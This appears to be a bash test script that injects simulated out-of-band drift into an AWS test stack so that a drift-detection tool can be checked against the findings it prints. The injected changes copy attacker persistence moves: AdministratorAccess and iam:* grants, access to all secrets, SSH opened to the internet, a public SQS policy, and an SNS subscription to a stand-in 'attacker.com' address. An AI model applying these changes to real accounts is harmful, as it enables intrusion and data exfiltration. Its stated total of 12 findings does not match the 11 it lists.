#!/usr/bin/env bash
set -euo pipefail

# Introduce known drift scenarios outside of CloudFormation.
# Run this AFTER deploy.sh to create detectable drift.

REGION="${AWS_REGION:-us-east-1}"
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)

echo "=== Introducing Known Drift Scenarios ==="
echo "Account: ${ACCOUNT_ID}"
echo "Region:  ${REGION}"
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# Scenario 1: Add an extra inline policy to BasicLambdaRole
# ─────────────────────────────────────────────────────────────────────────────
echo "→ Scenario 1: Adding extra inline policy to drift-test-basic-lambda..."
aws iam put-role-policy \
    --role-name drift-test-basic-lambda \
    --policy-name ManualS3Access \
    --policy-document '{
        "Version": "2012-10-17",
        "Statement": [{
            "Effect": "Allow",
            "Action": ["s3:GetObject", "s3:PutObject"],
            "Resource": "arn:aws:s3:::some-manual-bucket/*"
        }]
    }'
echo "  ✓ Added inline policy 'ManualS3Access'"

# ─────────────────────────────────────────────────────────────────────────────
# Scenario 2: Attach an extra managed policy to BasicLambdaRole
# ─────────────────────────────────────────────────────────────────────────────
echo "→ Scenario 2: Attaching extra managed policy to drift-test-basic-lambda..."
aws iam attach-role-policy \
    --role-name drift-test-basic-lambda \
    --policy-arn arn:aws:iam::aws:policy/AmazonS3ReadOnlyAccess
echo "  ✓ Attached 'AmazonS3ReadOnlyAccess'"

# ─────────────────────────────────────────────────────────────────────────────
# Scenario 3: Modify existing inline policy on ProcessorRole (add statement)
# ─────────────────────────────────────────────────────────────────────────────
echo "→ Scenario 3: Modifying existing inline policy on drift-test-processor..."
aws iam put-role-policy \
    --role-name drift-test-processor \
    --policy-name SQSAccess \
    --policy-document "{
        \"Version\": \"2012-10-17\",
        \"Statement\": [
            {
                \"Effect\": \"Allow\",
                \"Action\": [\"sqs:ReceiveMessage\", \"sqs:DeleteMessage\"],
                \"Resource\": \"arn:aws:sqs:${REGION}:${ACCOUNT_ID}:drift-test-queue\"
            },
            {
                \"Effect\": \"Allow\",
                \"Action\": [\"sqs:SendMessage\"],
                \"Resource\": \"arn:aws:sqs:${REGION}:${ACCOUNT_ID}:drift-test-output-queue\"
            }
        ]
    }"
echo "  ✓ Added extra statement to 'SQSAccess' policy"

# ─────────────────────────────────────────────────────────────────────────────
# Scenario 6: Add multiple policies to MultiDriftRole
# ─────────────────────────────────────────────────────────────────────────────
echo "→ Scenario 6: Adding multiple policies to drift-test-multi-drift..."
aws iam put-role-policy \
    --role-name drift-test-multi-drift \
    --policy-name UnauthorizedEC2Access \
    --policy-document '{
        "Version": "2012-10-17",
        "Statement": [{
            "Effect": "Allow",
            "Action": "ec2:*",
            "Resource": "*"
        }]
    }'
aws iam put-role-policy \
    --role-name drift-test-multi-drift \
    --policy-name UnauthorizedIAMAccess \
    --policy-document '{
        "Version": "2012-10-17",
        "Statement": [{
            "Effect": "Allow",
            "Action": "iam:*",
            "Resource": "*"
        }]
    }'
aws iam attach-role-policy \
    --role-name drift-test-multi-drift \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
echo "  ✓ Added 2 inline policies + AdministratorAccess"

# ─────────────────────────────────────────────────────────────────────────────
# Scenario 7: Add a policy to the bare role
# ─────────────────────────────────────────────────────────────────────────────
echo "→ Scenario 7: Adding inline policy to drift-test-bare..."
aws iam put-role-policy \
    --role-name drift-test-bare \
    --policy-name SneakyPolicy \
    --policy-document '{
        "Version": "2012-10-17",
        "Statement": [{
            "Effect": "Allow",
            "Action": "secretsmanager:GetSecretValue",
            "Resource": "*"
        }]
    }'
echo "  ✓ Added inline policy 'SneakyPolicy'"

# ─────────────────────────────────────────────────────────────────────────────
# Scenario 4 & 5: NO changes to CdkStyleRole or NestedRole
# These should remain IN_SYNC
# ─────────────────────────────────────────────────────────────────────────────
echo "→ Scenario 4 & 5: No changes to CdkStyleRole or NestedRole (should be in sync)"

# ─────────────────────────────────────────────────────────────────────────────
# Scenario 8: Add extra ingress rule to Security Group
# ─────────────────────────────────────────────────────────────────────────────
SG_ID=$(aws cloudformation describe-stack-resource \
    --stack-name drift-test-stack \
    --logical-resource-id TestSecurityGroup \
    --query 'StackResourceDetail.PhysicalResourceId' \
    --output text)

echo "→ Scenario 8: Adding extra ingress rule to security group ${SG_ID}..."
aws ec2 authorize-security-group-ingress \
    --group-id "${SG_ID}" \
    --protocol tcp \
    --port 22 \
    --cidr 0.0.0.0/0
echo "  ✓ Added SSH ingress rule (0.0.0.0/0:22)"

# ─────────────────────────────────────────────────────────────────────────────
# Scenario 9: Add extra policy statement to SQS queue
# ─────────────────────────────────────────────────────────────────────────────
QUEUE_URL=$(aws cloudformation describe-stack-resource \
    --stack-name drift-test-stack \
    --logical-resource-id TestQueue \
    --query 'StackResourceDetail.PhysicalResourceId' \
    --output text)

QUEUE_ARN=$(aws sqs get-queue-attributes \
    --queue-url "${QUEUE_URL}" \
    --attribute-names QueueArn \
    --query 'Attributes.QueueArn' \
    --output text)

echo "→ Scenario 9: Adding extra policy statement to SQS queue..."
CURRENT_POLICY=$(aws sqs get-queue-attributes \
    --queue-url "${QUEUE_URL}" \
    --attribute-names Policy \
    --query 'Attributes.Policy' \
    --output text)

# Add a sneaky statement to the existing policy
NEW_POLICY=$(python3 -c "
import json, sys
policy = json.loads('${CURRENT_POLICY}') if '${CURRENT_POLICY}' != 'None' else {'Version': '2012-10-17', 'Statement': []}
policy['Statement'].append({
    'Sid': 'SneakyAccess',
    'Effect': 'Allow',
    'Principal': {'AWS': '*'},
    'Action': 'sqs:*',
    'Resource': '${QUEUE_ARN}'
})
print(json.dumps(policy))
")

# Write attributes JSON to temp file to avoid shell quoting issues
ATTRS_FILE=$(mktemp)
python3 -c "
import json
policy = json.loads('''${NEW_POLICY}''')
attrs = {'Policy': json.dumps(policy)}
print(json.dumps(attrs))
" > "${ATTRS_FILE}"

aws sqs set-queue-attributes \
    --queue-url "${QUEUE_URL}" \
    --attributes file://"${ATTRS_FILE}"
rm -f "${ATTRS_FILE}"
echo "  ✓ Added 'SneakyAccess' statement to queue policy"

# ─────────────────────────────────────────────────────────────────────────────
# Scenario 10: Add extra subscription to SNS topic
# ─────────────────────────────────────────────────────────────────────────────
TOPIC_ARN=$(aws cloudformation describe-stack-resource \
    --stack-name drift-test-stack \
    --logical-resource-id TestTopic \
    --query 'StackResourceDetail.PhysicalResourceId' \
    --output text)

echo "→ Scenario 10: Adding extra subscription to SNS topic..."
aws sns subscribe \
    --topic-arn "${TOPIC_ARN}" \
    --protocol email \
    --notification-endpoint sneaky@attacker.com
echo "  ✓ Added email subscription to sneaky@attacker.com"

# ─────────────────────────────────────────────────────────────────────────────
# Scenario 11: Add extra rule to EventBridge bus
# ─────────────────────────────────────────────────────────────────────────────
echo "→ Scenario 11: Adding extra rule to EventBridge bus..."
aws events put-rule \
    --name sneaky-exfil-rule \
    --event-bus-name drift-test-bus \
    --event-pattern '{"source": ["custom.exfil"]}' \
    --state ENABLED
echo "  ✓ Added 'sneaky-exfil-rule' to drift-test-bus"

echo ""
echo "═══════════════════════════════════════════════════════════════"
echo "  Drift introduced successfully!"
echo "═══════════════════════════════════════════════════════════════"
echo ""
echo "Expected findings when running cfn-drift-extended:"
echo ""
echo "  drift-test-basic-lambda:"
echo "    - INLINE_POLICY_ADDED: ManualS3Access"
echo "    - MANAGED_POLICY_ATTACHED: AmazonS3ReadOnlyAccess"
echo ""
echo "  drift-test-processor:"
echo "    - INLINE_POLICY_MODIFIED: SQSAccess (extra sqs:SendMessage statement)"
echo ""
echo "  drift-test-cdk-style:"
echo "    - IN_SYNC (no drift expected)"
echo ""
echo "  drift-test-nested-role:"
echo "    - IN_SYNC (no drift expected)"
echo ""
echo "  drift-test-multi-drift:"
echo "    - INLINE_POLICY_ADDED: UnauthorizedEC2Access"
echo "    - INLINE_POLICY_ADDED: UnauthorizedIAMAccess"
echo "    - MANAGED_POLICY_ATTACHED: AdministratorAccess"
echo ""
echo "  drift-test-bare:"
echo "    - INLINE_POLICY_ADDED: SneakyPolicy"
echo ""
echo "  drift-test-sg:"
echo "    - SECURITY_GROUP_INGRESS_ADDED: tcp/22 from 0.0.0.0/0"
echo ""
echo "  drift-test-queue:"
echo "    - SQS_POLICY_STATEMENT_ADDED: SneakyAccess"
echo ""
echo "  drift-test-topic:"
echo "    - SNS_SUBSCRIPTION_ADDED: email:sneaky@attacker.com"
echo ""
echo "  drift-test-bus:"
echo "    - EVENTBRIDGE_RULE_ADDED: sneaky-exfil-rule"
echo ""
echo "Total expected findings: 12"
echo ""
echo "Next step: Run ./validate.sh"
